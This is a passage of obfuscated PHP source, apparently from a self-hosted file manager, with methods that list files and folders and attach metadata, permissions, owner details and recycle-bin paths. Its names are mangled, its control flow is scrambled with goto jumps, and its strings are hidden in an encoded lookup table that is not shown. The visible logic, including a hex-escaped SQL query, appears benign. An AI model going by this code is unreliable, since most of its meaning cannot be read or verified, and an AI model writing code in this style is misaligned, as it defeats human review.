_listDataApplyItem($CÉÏŠîÏˆê, $B¬´æ¼Ï•õ = false) { $cÀÎ—«ÚÎÈ = array($CÉÏŠîÏˆê); $this->_listDataApply($cÀÎ—«ÚÎÈ, $B¬´æ¼Ï•õ); return $cÀÎ—«ÚÎÈ[0]; } protected function _listDataApply(&$BÙñÏİÎ¤, $Dï‘Š¢œŸÄ = false) { goto E‚ù®¡ˆ²; E‚ù®¡ˆ²: $AŒ†–ˆŠ‘‚ =& $_SERVER[”Ì÷ñ­î¸]; if (!$BÙñÏİÎ¤) { $BÙñÏİÎ¤ = array(); return; } $B™á„­í»¨ = array_to_keyvalue($BÙñÏİÎ¤, $AŒ†–ˆŠ‘‚[33], $AŒ†–ˆŠ‘‚[369]); goto e©ˆÜ¤£¢¡; BßŸÀÓŠã: $this->_listAppendUser($BÙñÏİÎ¤); $this->_listFilterInfo($BÙñÏİÎ¤, $Dï‘Š¢œŸÄ); goto e„™²´Ã‚Å; b­àÏÁ×§Ã: $this->_listAppendPath($BÙñÏİÎ¤); $this->_listAppendAuth($BÙñÏİÎ¤); $this->_listAppendSourceInfo($BÙñÏİÎ¤, $B™á„­í»¨); goto BßŸÀÓŠã; e©ˆÜ¤£¢¡: $B™á„­í»¨ = array_unique($B™á„­í»¨); $this->_listSourceCache($BÙñÏİÎ¤); if (!$Dï‘Š¢œŸÄ) { $this->_listAppendMeta($BÙñÏİÎ¤, $B™á„­í»¨); $this->_listAppendFileMeta($BÙñÏİÎ¤, $B™á„­í»¨); $this->_listAppendChildren($BÙñÏİÎ¤, $B™á„­í»¨); } goto b­àÏÁ×§Ã; e„™²´Ã‚Å: } protected function _listSourceCache($a¯ØÅ±Å›) { $e”ƒìÁ‰· =& $_SERVER[”Ì÷ñ­î¸]; foreach ($a¯ØÅ±Å› as $AËÉ´øö‡•) { self::$cacheSourceInfo[$e”ƒìÁ‰·[410] . $AËÉ´øö‡•[$e”ƒìÁ‰·[369]]] = $AËÉ´øö‡•; } } protected function _listFilterInfo(&$EÎõÛ¢„ÊŸ, $C–ÆŠËå¯Ô = false) { $bºëÙ×²Öõ =& $_SERVER[”Ì÷ñ­î¸]; foreach ($EÎõÛ¢„ÊŸ as &$ašŸãĞòÎé) { $ašŸãĞòÎé = $this->pathInfoFilter($ašŸãĞòÎé); self::$cachePathInfo[$bºëÙ×²Öõ[411] . intval($C–ÆŠËå¯Ô) . $bºëÙ×²Öõ[412] . $ašŸãĞòÎé[$bºëÙ×²Öõ[369]]] = $ašŸãĞòÎé; } } protected function _listMake(&$Bõ‰æò½ã†) { $Bçí°ã°ª… =& $_SERVER[”Ì÷ñ­î¸]; $Bõ‰æò½ã†[$Bçí°ã°ª…[74]] = array(); $Bõ‰æò½ã†[$Bçí°ã°ª…[73]] = array(); foreach ($Bõ‰æò½ã†[$Bçí°ã°ª…[354]] as $E–Ñ¶Öº¥») { $f»Àó¦óÖ = $E–Ñ¶Öº¥»[$Bçí°ã°ª…[370]] == 1 ? $Bçí°ã°ª…[74] : $Bçí°ã°ª…[73]; $Bõ‰æò½ã†[$f»Àó¦óÖ][] = $E–Ñ¶Öº¥»; } unset($Bõ‰æò½ã†[$Bçí°ã°ª…[354]]); } protected function _listAppendMeta(&$eØâãÔ™‘, $AàÖ¶Éë¦¦) { goto E§Íø“©Í; E§Íø“©Í: $aÙöÍôìˆõ =& $_SERVER[”Ì÷ñ­î¸]; $A˜Ù©ãÕ‚ = array($aÙöÍôìˆõ[383] => array($aÙöÍôìˆõ[384], $AàÖ¶Éë¦¦)); $a¤ÔÀ›ƒ•¯ = Model($aÙöÍôìˆõ[413])->field($aÙöÍôìˆõ[414])->where($A˜Ù©ãÕ‚)->select(); goto AÀ¹ÈÌœâˆ; AÀ¹ÈÌœâˆ: if (!$a¤ÔÀ›ƒ•¯) { return; } $E–å¶Š—‹Ï = array($aÙöÍôìˆõ[415], $aÙöÍôìˆõ[416]); $aŠ––¢§… = array(); goto d¦‘á„¶®š; d¦‘á„¶®š: foreach ($a¤ÔÀ›ƒ•¯ as $bªí¶Á†ï) { if (!isset($aŠ––¢§…[$bªí¶Á†ï[$aÙöÍôìˆõ[369]]])) { $aŠ––¢§…[$bªí¶Á†ï[$aÙöÍôìˆõ[369]]] = array(); } if (in_array($bªí¶Á†ï[$aÙöÍôìˆõ[89]], $E–å¶Š—‹Ï)) { continue; } $aŠ––¢§…[$bªí¶Á†ï[$aÙöÍôìˆõ[369]]][$bªí¶Á†ï[$aÙöÍôìˆõ[89]]] = $bªí¶Á†ï[$aÙöÍôìˆõ[359]]; } foreach ($eØâãÔ™‘ as &$Cª¤©×ÑÈÛ) { $Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[417]] = !1; if (isset($aŠ––¢§…[$Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[369]]])) { $Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[417]] = $aŠ––¢§…[$Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[369]]]; } if ($this->fileIsLock($Cª¤©×ÑÈÛ) && $Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[376]]) { $BÀâˆïø‘½ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[376]][$aÙöÍôìˆõ[377]] = AuthModel::authDisable($Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[376]][$aÙöÍôìˆõ[377]], $BÀâˆïø‘½); $Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[376]][$aÙöÍôìˆõ[418]][$aÙöÍôìˆõ[376]] = $Cª¤©×ÑÈÛ[$aÙöÍôìˆõ[376]][$aÙöÍôìˆõ[377]]; } } goto côÁîª¡Şº; côÁîª¡Şº: } protected function _listAppendFileMeta(&$Aï™åØŠ–, $eéƒóùÃíŒ) { goto ašŒ˜ƒÚŸï; D‚ÊĞÏëÎø: foreach ($Aï™åØŠ– as &$Fº½á…òğß) { goto aâ¤¡£áâ•; dÙÛÃèÑ¼½: if (isset($Fº½á…òğß[$aÇáíÕèÖé[162]][$aÇáíÕèÖé[426]])) { $Fº½á…òğß[$aÇáíÕèÖé[426]] = json_decode($Fº½á…òğß[$aÇáíÕèÖé[162]][$aÇáíÕèÖé[426]], !0); unset($Fº½á…òğß[$aÇáíÕèÖé[162]][$aÇáíÕèÖé[426]]); } goto eÏéŒÌŒ²; AÑ‚Úîìğ²: unset($fçÑ†‡Ûñß[$DçÔßÙïª][$aÇáíÕèÖé[75]]); $Fî‰ÂÊ’œ¢ = is_array($aæ®‡—³İ[$DçÔßÙïª]) ? $aæ®‡—³İ[$DçÔßÙïª] : array(); $Fº½á…òğß[$aÇáíÕèÖé[162]] = array_merge($Fî‰ÂÊ’œ¢, $fçÑ†‡Ûñß[$DçÔßÙïª]); goto dÙÛÃèÑ¼½; aâ¤¡£áâ•: $DçÔßÙïª = $Fº½á…òğß[$aÇáíÕèÖé[419]]; if (!$DçÔßÙïª || !isset($fçÑ†‡Ûñß[$DçÔßÙïª])) { continue; } $dà¥ŒôöŒ = $fçÑ†‡Ûñß[$DçÔßÙïª]; goto c¨•øàã¤Ë; c¨•øàã¤Ë: $dà¥ŒôöŒ[$aÇáíÕèÖé[77]] = $Fº½á…òğß[$aÇáíÕèÖé[77]]; $dà¥ŒôöŒ[$aÇáíÕèÖé[28]] = $Fº½á…òğß[$aÇáíÕèÖé[28]]; self::$cacheFileInfo[$aÇáíÕèÖé[425] . $DçÔßÙïª] = $dà¥ŒôöŒ; goto AÑ‚Úîìğ²; eÏéŒÌŒ²: } goto A¥ôä„ˆÉÌ; d®‰’ùˆ—ğ: if (!$AÂÍâŠÄæ) { return; } $fîÛ´ãÖÚ‘ = array($aÇáíÕèÖé[420] => array($aÇáíÕèÖé[384], $AÂÍâŠÄæ)); $DöºÖ‘„øµ = $aÇáíÕèÖé[421]; goto DÔòÆ†Á‘Ç; DÔòÆ†Á‘Ç: $fçÑ†‡Ûñß = Model($aÇáíÕèÖé[422])->field($DöºÖ‘„øµ)->where($fîÛ´ãÖÚ‘)->select(); $fçÑ†‡Ûñß = array_to_keyvalue($fçÑ†‡Ûñß, $aÇáíÕèÖé[419]); $eíšË¹ã¾ = Model($aÇáíÕèÖé[423])->field($aÇáíÕèÖé[424])->where($fîÛ´ãÖÚ‘)->select(); goto d³†«ç­«; d³†«ç­«: $eíšË¹ã¾ = $eíšË¹ã¾ ? $eíšË¹ã¾ : array(); $aæ®‡—³İ = array(); foreach ($eíšË¹ã¾ as $cÑîŒÌ‡) { if (!isset($aæ®‡—³İ[$cÑîŒÌ‡[$aÇáíÕèÖé[419]]])) { $aæ®‡—³İ[$cÑîŒÌ‡[$aÇáíÕèÖé[419]]] = array(); } $aæ®‡—³İ[$cÑîŒÌ‡[$aÇáíÕèÖé[419]]][$cÑîŒÌ‡[$aÇáíÕèÖé[89]]] = $cÑîŒÌ‡[$aÇáíÕèÖé[359]]; } goto D‚ÊĞÏëÎø; ašŒ˜ƒÚŸï: $aÇáíÕèÖé =& $_SERVER[”Ì÷ñ­î¸]; $AÂÍâŠÄæ = array_to_keyvalue($Aï™åØŠ–, $aÇáíÕèÖé[33], $aÇáíÕèÖé[419]); $AÂÍâŠÄæ = array_filter(array_unique($AÂÍâŠÄæ)); goto d®‰’ùˆ—ğ; A¥ôä„ˆÉÌ: } protected function _listAppendSourceInfo(&$cÀîõ·å¤ù, $bŸ¼„ÖÖù‚) { goto bŠ“Â§èÜ; bŠ“Â§èÜ: $a“˜…Üê© =& $_SERVER[”Ì÷ñ­î¸]; if (!defined($a“˜…Üê©[427])) { return; } $FŞâä¸«Î = Model($a“˜…Üê©[428])->listData(); goto aŒËĞ‡ƒ°; DÛÃ²ùÊ‡½: $D¥ôÔÒ—·¥ = array_to_keyvalue($FŞâä¸«Î, $a“˜…Üê©[367]); $eÍã†ì÷™ = array_to_keyvalue_group($AÄô¼á, $a“˜…Üê©[75], $a“˜…Üê©[393]); $DàˆñéËÂŠ = array_to_keyvalue($AÒ¦òß‡—, $a“˜…Üê©[75]); goto E³ã×ÖµäŸ; aŒËĞ‡ƒ°: $AÄô¼á = Model($a“˜…Üê©[392])->listData(); $AÒ¦òß‡— = Model($a“˜…Üê©[381])->listData(); $cèé‡ÎÊ…… = Model($a“˜…Üê©[429])->listSimple(); goto DÛÃ²ùÊ‡½; E³ã×ÖµäŸ: $Eî–ïÇæŒ® = array_to_keyvalue_group($cèé‡ÎÊ……, $a“˜…Üê©[369]); foreach ($cÀîõ·å¤ù as &$bá§¿­öˆ) { $bá§¿­öˆ[$a“˜…Üê©[391]] = array($a“˜…Üê©[430] => 0, $a“˜…Üê©[431] => 0, $a“˜…Üê©[432] => 0); if (isset($DàˆñéËÂŠ[$bá§¿­öˆ[$a“˜…Üê©[369]]])) { $bá§¿­öˆ[$a“˜…Üê©[391]][$a“˜…Üê©[433]] = 1; $bá§¿­öˆ[$a“˜…Üê©[391]][$a“˜…Üê©[434]] = $DàˆñéËÂŠ[$bá§¿­öˆ[$a“˜…Üê©[369]]][$a“˜…Üê©[28]]; } if (isset($eÍã†ì÷™[$bá§¿­öˆ[$a“˜…Üê©[369]]])) { $bá§¿­öˆ[$a“˜…Üê©[391]][$a“˜…Üê©[435]] = array(); foreach ($eÍã†ì÷™[$bá§¿­öˆ[$a“˜…Üê©[369]]] as $C®¯Ô‰Å“é) { $c·ÅÕíÎ = $D¥ôÔÒ—·¥[$C®¯Ô‰Å“é]; $bá§¿­öˆ[$a“˜…Üê©[391]][$a“˜…Üê©[435]][] = array($a“˜…Üê©[436] => $c·ÅÕíÎ[$a“˜…Üê©[367]], $a“˜…Üê©[386] => $c·ÅÕíÎ[$a“˜…Üê©[28]], $a“˜…Üê©[437] => $c·ÅÕíÎ[$a“˜…Üê©[438]]); } } if (isset($Eî–ïÇæŒ®[$bá§¿­öˆ[$a“˜…Üê©[369]]])) { $bá§¿­öˆ[$a“˜…Üê©[391]][$a“˜…Üê©[439]] = array(); foreach ($Eî–ïÇæŒ®[$bá§¿­öˆ[$a“˜…Üê©[369]]] as $C¨³»Ç½Ã—) { $bá§¿­öˆ[$a“˜…Üê©[391]][$a“˜…Üê©[439]] = array($a“˜…Üê©[440] => $C¨³»Ç½Ã—[$a“˜…Üê©[441]], $a“˜…Üê©[442] => $C¨³»Ç½Ã—[$a“˜…Üê©[443]], $a“˜…Üê©[444] => $C¨³»Ç½Ã—[$a“˜…Üê©[369]], $a“˜…Üê©[445] => $C¨³»Ç½Ã—[$a“˜…Üê©[446]], $a“˜…Üê©[447] => $C¨³»Ç½Ã—[$a“˜…Üê©[448]]); } } } return $cÀîõ·å¤ù; goto DêÍ›«­«; DêÍ›«­«: } protected function _listAppendChildren(&$a™ƒ®Œ‘å†, $dš‰ŠÏÑ¢Ü) { goto DÄÂ¤‰ËÚ; aØ—É«§õ: $Eœ—¸¢à = $this->tablePrefix . $this->tableName; for ($Bšåï‘¸ì÷ = 0; $Bšåï‘¸ì÷ < $aà›»±¹÷; $Bšåï‘¸ì÷++) { $E¥‹£‹ = intval($a™ƒ®Œ‘å†[$Bšåï‘¸ì÷][$B¥õøéˆæŞ[397]]); if ($a™ƒ®Œ‘å†[$Bšåï‘¸ì÷][$B¥õøéˆæŞ[370]]) { $b¡×ÆÙßßƒ = $a™ƒ®Œ‘å†[$Bšåï‘¸ì÷][$B¥õøéˆæŞ[369]]; $FìŸ¹Ü‹¹ .= "\123\105\x4c\105\103\x54\x20\52\40\106\122\x4f\x4d\40\x28\x53\x45\114\x45\x43\x54\x20\x27{$b¡×ÆÙßßƒ}\137\x68\141\163\106\x69\x6c\x65\x27\40\141\163\40\x68\x61\163\54\143\157\165\x6e\x74\x28\61\x29\x20\x61\163\x20\x68\141\x73\103\157\165\x6e\164\40\x46\x52\117\115\x20\140{$Eœ—¸¢à}\140\40\12\11\11\11\x9\x9\x77\x68\x65\x72\145\40\160\141\x72\x65\x6e\164\x49\104\x3d{$b¡×ÆÙßßƒ}\x20\141\156\x64\40\151\x73\x46\157\154\x64\145\162\x3d\x30\x20\x61\x6e\x64\40\151\x73\x44\x65\x6c\x65\x74\x65\x3d{$E¥‹£‹}\51\40\x61\163\x20\x74\142\61\x5f{$b¡×ÆÙßßƒ}\40\165\x6e\151\157\x6e\x20\x61\x6c\x6c\x20\12\11\11\11\x9\11\x53\105\114\x45\103\124\40\x2a\x20\106\x52\x4f\x4d\40\x28\123\x45\x4c\105\103\x54\x20\47{$b¡×ÆÙßßƒ}\137\150\x61\x73\x46\x6f\x6c\144\x65\x72\47\40\141\163\x20\150\x61\163\x46\x69\x6c\x65\54\x63\x6f\165\x6e\x74\x28\61\x29\x20\141\x73\x20\150\141\163\103\157\x75\156\164\x20\106\122\117\x4d\x20\140{$Eœ—¸¢à}\140\x20\12\11\x9\11\11\x9\167\x68\x65\162\145\x20\160\141\x72\x65\x6e\x74\111\x44\75{$b¡×ÆÙßßƒ}\40\141\x6e\x64\x20\x69\163\106\157\x6c\144\x65\x72\x3d\x31\40\141\156\144\x20\151\x73\x44\145\x6c\145\x74\x65\75{$E¥‹£‹}\x29\x20\x61\x73\40\x74\142\x32\137{$b¡×ÆÙßßƒ}\40\x75\x6e\x69\x6f\x6e\40\141\154\x6c\x20"; } if ((strlen($FìŸ¹Ü‹¹) >= $bŠ¨Õù›š¿ || $Bšåï‘¸ì÷ == $aà›»±¹÷ - 1) && $FìŸ¹Ü‹¹) { $FìŸ¹Ü‹¹ = substr($FìŸ¹Ü‹¹, 0, -strlen($B¥õøéˆæŞ[449])); $B ‹¦ãË‘Ø = $this->query($FìŸ¹Ü‹¹); $bé£²éø»Ï = array_merge($bé£²éø»Ï, $B ‹¦ãË‘Ø); $FìŸ¹Ü‹¹ = $B¥õøéˆæŞ[33]; } } $bé£²éø»Ï = array_to_keyvalue($bé£²éø»Ï, $B¥õøéˆæŞ[450]); goto a¨â»¢‡‘¸; e¢»Ó’ÌùÂ: $bŠ¨Õù›š¿ = 1024 * 50; $a™ƒ®Œ‘å† = is_array($a™ƒ®Œ‘å†) ? $a™ƒ®Œ‘å† : array(); $aà›»±¹÷ = count($a™ƒ®Œ‘å†); goto aØ—É«§õ; a¨â»¢‡‘¸: foreach ($a™ƒ®Œ‘å† as &$dª­¦–æÚÈ) { if ($dª­¦–æÚÈ[$B¥õøéˆæŞ[370]]) { unset($dª­¦–æÚÈ[$B¥õøéˆæŞ[372]]); $dª­¦–æÚÈ[$B¥õøéˆæŞ[192]] = intval($bé£²éø»Ï[$dª­¦–æÚÈ[$B¥õøéˆæŞ[369]] . $B¥õøéˆæŞ[451]][$B¥õøéˆæŞ[452]]); $dª­¦–æÚÈ[$B¥õøéˆæŞ[191]] = intval($bé£²éø»Ï[$dª­¦–æÚÈ[$B¥õøéˆæŞ[369]] . $B¥õøéˆæŞ[453]][$B¥õøéˆæŞ[452]]); } } goto Bßóª‘¶ç·; DÄÂ¤‰ËÚ: $B¥õøéˆæŞ =& $_SERVER[”Ì÷ñ­î¸]; $FìŸ¹Ü‹¹ = $B¥õøéˆæŞ[361]; $bé£²éø»Ï = array(); goto e¢»Ó’ÌùÂ; Bßóª‘¶ç·: } protected function _listAppendAuth(&$A™ƒ×¯åÚ¯) { goto aèèäÂ”½Æ; EÛëÉë¥ó: foreach ($A™ƒ×¯åÚ¯ as $e…Ú øØ) { if ($e…Ú øØ[$AŠ«½›„­ô[371]] == self::TYPE_GROUP) { $DËàƒë Å[] = $e…Ú øØ[$AŠ«½›„­ô[369]]; } } if (!$DËàƒë Å) { return; } $fĞØ§¿¤ÅŠ = array_to_keyvalue($A™ƒ×¯åÚ¯, $AŠ«½›„­ô[369]); goto f“™ªèÚíî; f“™ªèÚíî: $C‘µîê¸ŠÅ = Model($AŠ«½›„­ô[454])->getSourceList($DËàƒë Å, $fĞØ§¿¤ÅŠ); foreach ($A™ƒ×¯åÚ¯ as $D¤œ¢§™ëÈ => &$e…Ú øØ) { $e…Ú øØ[$AŠ«½›„­ô[376]] = $C‘µîê¸ŠÅ[$e…Ú øØ[$AŠ«½›„­ô[369]]]; if (!$e…Ú øØ[$AŠ«½›„­ô[376]] && $e…Ú øØ[$AŠ«½›„­ô[371]] == self::TYPE_GROUP) { $e…Ú øØ[$AŠ«½›„­ô[376]] = Action($AŠ«½›„­ô[455])->pathGroupAuthMake($e…Ú øØ[$AŠ«½›„­ô[456]]); if (!$e…Ú øØ[$AŠ«½›„­ô[376]] && !_get($GLOBALS, $AŠ«½›„­ô[457])) { $e…Ú øØ[$AŠ«½›„­ô[189]] = !1; $e…Ú øØ[$AŠ«½›„­ô[188]] = !1; } } if ($e…Ú øØ[$AŠ«½›„­ô[376]]) { $e…Ú øØ[$AŠ«½›„­ô[189]] = AuthModel::authCheckEdit($e…Ú øØ[$AŠ«½›„­ô[376]][$AŠ«½›„­ô[377]]); $e…Ú øØ[$AŠ«½›„­ô[188]] = AuthModel::authCheckView($e…Ú øØ[$AŠ«½›„­ô[376]][$AŠ«½›„­ô[377]]); } $this->groupPathDisplay($e…Ú øØ); } goto Fğ·¤½ï£³; aèèäÂ”½Æ: $AŠ«½›„­ô =& $_SERVER[”Ì÷ñ­î¸]; if (!defined($AŠ«½›„­ô[427])) { return; } $DËàƒë Å = array(); goto EÛëÉë¥ó; Fğ·¤½ï£³: } public function groupPathDisplay(&$däŒ„·±Ï) { goto fã½Ê—Æ››; C†Â‹ÖÎã½: $däŒ„·±Ï[$A¢Œµ´Óâ[464]] = $e½Ñ«’É¥º . $cµÈâŠù[$A¢Œµ´Óâ[391]][$A¢Œµ´Óâ[369]]; goto Cè“‘øó˜Æ; A„…Ê‡§œ¬: $Ağ„­¼Åªß = $this->parentLevelArray($cµÈâŠù[$A¢Œµ´Óâ[459]]); $e½Ñ«’É¥º = $A¢Œµ´Óâ[33]; foreach ($Ağ„­¼Åªß as $FÙÈ¾ß„¹) { $Dëë×¿Ñˆ = Model($A¢Œµ´Óâ[458])->getInfo($FÙÈ¾ß„¹); $e½Ñ«’É¥º .= $Dëë×¿Ñˆ[$A¢Œµ´Óâ[391]][$A¢Œµ´Óâ[369]] . $A¢Œµ´Óâ[47]; } goto b¹«óëÍ®; fã½Ê—Æ››: $A¢Œµ´Óâ =& $_SERVER[”Ì÷ñ­î¸]; if ($däŒ„·±Ï[$A¢Œµ´Óâ[371]] != self::TYPE_GROUP) { return; } $cµÈâŠù = Model($A¢Œµ´Óâ[458])->getInfo($däŒ„·±Ï[$A¢Œµ´Óâ[456]]); goto A„…Ê‡§œ¬; b¹«óëÍ®: $däŒ„·±Ï[$A¢Œµ´Óâ[460]] = $cµÈâŠù[$A¢Œµ´Óâ[461]]; $däŒ„·±Ï[$A¢Œµ´Óâ[380]] = $cµÈâŠù[$A¢Œµ´Óâ[459]]; $däŒ„·±Ï[$A¢Œµ´Óâ[462]] = $cµÈâŠù[$A¢Œµ´Óâ[463]]; goto C†Â‹ÖÎã½; Cè“‘øó˜Æ: } protected function _listAppendPath(&$f¥Ç™ÍÛŞ) { goto eì—œĞÏç; eì—œĞÏç: $a°´Ä¦È² =& $_SERVER[”Ì÷ñ­î¸]; $BåìÀµğ‹… = array(); foreach ($f¥Ç™ÍÛŞ as &$aÁ•Âèİ¡) { $BåìÀµğ‹…[$aÁ•Âèİ¡[$a°´Ä¦È²[369]]] = $aÁ•Âèİ¡[$a°´Ä¦È²[28]]; $a”Õ·Ä›Ë = $this->parentLevelArray($aÁ•Âèİ¡[$a°´Ä¦È²[459]]); array_shift($a”Õ·Ä›Ë); foreach ($a”Õ·Ä›Ë as $c‡›ÇéìÀÍ) { if (!isset($BåìÀµğ‹…[$c‡›ÇéìÀÍ])) { $BåìÀµğ‹…[$c‡›ÇéìÀÍ] = 0; } } } goto CÖÇá‡Û¹¿; CÖÇá‡Û¹¿: $D¥Ğ„µìŒ‘ = array(); foreach ($BåìÀµğ‹… as $E†ãÇ´¾î˜ => $dÆ©‰ÖÙ÷¶) { if (!$dÆ©‰ÖÙ÷¶) { $D¥Ğ„µìŒ‘[] = $E†ãÇ´¾î˜; } } if ($D¥Ğ„µìŒ‘) { $Cè¤‡ÈÙÕ¢ = array($a°´Ä¦È²[383] => array($a°´Ä¦È²[384], $D¥Ğ„µìŒ‘)); if (count($D¥Ğ„µìŒ‘) == 1) { $e¦ÅÆíË¶ = $this->sourceInfo($D¥Ğ„µìŒ‘[0]); $e¦ÅÆíË¶ = is_array($e¦ÅÆíË¶) ? array($e¦ÅÆíË¶) : !1; } else { $e¦ÅÆíË¶ = $this->field($a°´Ä¦È²[465])->where($Cè¤‡ÈÙÕ¢)->select(); } $DõÇÃ‘Šáè = array_to_keyvalue($e¦ÅÆíË¶, $a°´Ä¦È²[369], $a°´Ä¦È²[28]); $BåìÀµğ‹… = array_merge_index($BåìÀµğ‹…, $DõÇÃ‘Šáè); } goto A‚¤Ò÷Ú¬ê; A‚¤Ò÷Ú¬ê: $EÑ¯“Êàî¦ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($f¥Ç™ÍÛŞ as &$aÁ•Âèİ¡) { goto FÖ´ÚĞçÓ©; FŸ²õ²ñ§: $a«’…ÅÂ… = trim($aÁ•Âèİ¡[$a°´Ä¦È²[466]], $a°´Ä¦È²[8]); if ($aÁ•Âèİ¡[$a°´Ä¦È²[461]] == $a°´Ä¦È²[468] && $a«’…ÅÂ…) { $aÁ•Âèİ¡[$a°´Ä¦È²[28]] = $a«’…ÅÂ…; } $this->_listAppendPathRecycle($aÁ•Âèİ¡, $a”Õ·Ä›Ë, $EÑ¯“Êàî¦); goto f²…·»ˆ“; eÔ‘ì¥ˆî: if ($a”Õ·Ä›Ë) { $CæİÉª‰™ğ .= $aÁ•Âèİ¡[$a°´Ä¦È²[28]]; } if ($aÁ•Âèİ¡[$a°´Ä¦È²[370]]) { $CæİÉª‰™ğ .= $a°´Ä¦È²[8]; } $aÁ•Âèİ¡[$a°´Ä¦È²[466]] = str_replace($a°´Ä¦È²[467], $a°´Ä¦È²[8], $CæİÉª‰™ğ); goto FŸ²õ²ñ§; FÖ´ÚĞçÓ©: $a”Õ·Ä›Ë = $this->parentLevelArray($aÁ•Âèİ¡[$a°´Ä¦È²[459]]); $CæİÉª‰™ğ = $this->_listAppendPathRoot($aÁ•Âèİ¡, $a”Õ·Ä›Ë); foreach ($a”Õ·Ä›Ë as $c‡›ÇéìÀÍ) { if (isset($BåìÀµğ‹…[$c‡›ÇéìÀÍ])) { $CæİÉª‰™ğ .= $BåìÀµğ‹…[$c‡›ÇéìÀÍ] . $a°´Ä¦È²[8]; } } goto eÔ‘ì¥ˆî; f²…·»ˆ“: } goto cŒİ½Ä”Ò¦; cŒİ½Ä”Ò¦: } private function _listAppendPathRecycle(&$cŞÚ¶¸ª»ë, $A¢é‹„Şô, $bÀÑÚíÚ½å) { goto eëÒÑ¾òê´; eëÒÑ¾òê´: $Aè±‰ó³§È =& $_SERVER[”Ì÷ñ­î¸]; if (intval($cŞÚ¶¸ª»ë[$Aè±‰ó³§È[371]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($bÀÑÚíÚ½å, $A¢é‹„Şô) && $cŞÚ¶¸ª»ë[$Aè±‰ó³§È[369]] != $bÀÑÚíÚ½å) { return; } goto d¡òó‘®—Æ; dÛ‘Æ²°Ü–: $cŞÚ¶¸ª»ë[$Aè±‰ó³§È[459]] = $Aè±‰ó³§È[470] . implode($Aè±‰ó³§È[47], array_slice($A¢é‹„Şô, 1)) . $Aè±‰ó³§È[47]; if ($cŞÚ¶¸ª»ë[$Aè±‰ó³§È[369]] == $bÀÑÚíÚ½å) { $cŞÚ¶¸ª»ë[$Aè±‰ó³§È[459]] = $Aè±‰ó³§È[470]; $cŞÚ¶¸ª»ë[$Aè±‰ó³§È[461]] = $Aè±‰ó³§È[468]; $cŞÚ¶¸ª»ë[$Aè±‰ó³§È[28]] = LNG($Aè±‰ó³§È[469]); } $cŞÚ¶¸ª»ë[$Aè±‰ó³§È[471]] = $Aè±‰ó³§È[472]; goto DÇŒ¶©¡»Ú; d¡òó‘®—Æ: $AÖŒ˜®Ô˜ö = explode($Aè±‰ó³§È[8], trim($cŞÚ¶¸ª»ë[$Aè±‰ó³§È[466]], $Aè±‰ó³§È[8])); $dõ‰”Œ®á = implode($Aè±‰ó³§È[8], array_slice($AÖŒ˜®Ô˜ö, 2)); $cŞÚ¶¸ª»ë[$Aè±‰ó³§È[466]] = $Aè±‰ó³§È[8] . LNG($Aè±‰ó³§È[469]) . $Aè±‰ó³§È[8] . ltrim($dõ‰”Œ®á, $Aè±‰ó³§È[8]); goto dÛ‘Æ²°Ü–; DÇŒ¶©¡»Ú: } protected function _listAppendPathRoot(&$Cã¥ˆ‚ñÖ, $DĞÅŒ©Â„) { $C £«Ú´Ğì =& $_SERVER[”Ì÷ñ­î¸]; $F¬ ãíø¹¹ = $C £«Ú´Ğì[33]; if ($Cã¥ˆ‚ñÖ[$C £«Ú´Ğì[371]] == self::TYPE_USER) { if (defined($C £«Ú´Ğì[427]) && $Cã¥ˆ‚ñÖ[$C £«Ú´Ğì[456]] == USER_ID) { $F¬ ãíø¹¹ = LNG($C £«Ú´Ğì[473]); if (!$DĞÅŒ©Â„) { $Cã¥ˆ‚ñÖ[$C £«Ú´Ğì[28]] = $F¬ ãíø¹¹; } } else { $CÈ‡²‹æö = Model($C £«Ú´Ğì[474])->getInfoSimple($Cã¥ˆ‚ñÖ[$C £«Ú´Ğì[456]]); $F¬ ãíø¹¹ = LNG($C £«Ú´Ğì[475]) . $C £«Ú´Ğì[157] . $CÈ‡²‹æö[$C £«Ú´Ğì[28]] . $C £«Ú´Ğì[476]; } } else { if ($Cã¥ˆ‚ñÖ[$C £«Ú´Ğì[371]] == self::TYPE_GROUP) { $CÈ‡²‹æö = Model($C £«Ú´Ğì[458])->getInfoSimple($Cã¥ˆ‚ñÖ[$C £«Ú´Ğì[456]]); $F¬ ãíø¹¹ = $CÈ‡²‹æö[$C £«Ú´Ğì[28]]; } else { if ($Cã¥ˆ‚ñÖ[$C £«Ú´Ğì[371]] == self::TYPE_SYSTEM) { $CÈ‡²‹æö = $this->sourceInfo($DĞÅŒ©Â„[0], !0); $F¬ ãíø¹¹ = $CÈ‡²‹æö[$C £«Ú´Ğì[28]]; } } } $F¬ ãíø¹¹ = $F¬ ãíø¹¹ ? $C £«Ú´Ğì[8] . $F¬ ãíø¹¹ . $C £«Ú´Ğì[8] : $C £«Ú´Ğì[8]; return $F¬ ãíø¹¹; } protected function _listAppendUser(&$EÄçÁÇÒ†§) { $eéøÆ»æ× =& $_SERVER[”Ì÷ñ­î¸]; $eÃ¹¨ò‰‚— = array_to_keyvalue($EÄçÁÇÒ†§, $eéøÆ»æ×[33], $eéøÆ»æ×[378]); $AŠ¦¢¬ÁÌâ = array_to_keyvalue($EÄçÁÇÒ†§, $eéøÆ»æ×[33], $eéøÆ»æ×[379]); $Aê—î‚«½… = array_merge($eÃ¹¨ò‰‚—, $AŠ¦¢¬ÁÌâ); $bøƒ©ØÇ ° = Model($eéøÆ»æ×[477])->userListInfo($Aê—î‚«½…); foreach ($EÄçÁÇÒ†§ as &$D‚‚Ğ¥ÍÒ) { $Fª‘Òöñ«£ = $D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[378]]; $D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[378]] = $bøƒ©ØÇ °[$Fª‘Òöñ«£] ? $bøƒ©ØÇ °[$Fª‘Òöñ«£] : !1; $Fª‘Òöñ«£ = $D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[379]]; $D‚‚Ğ¥ÍÒ[$eéøÆ»æ×[379]] = $bøƒ©ØÇ °[$Fª‘Òöñ«£] ? 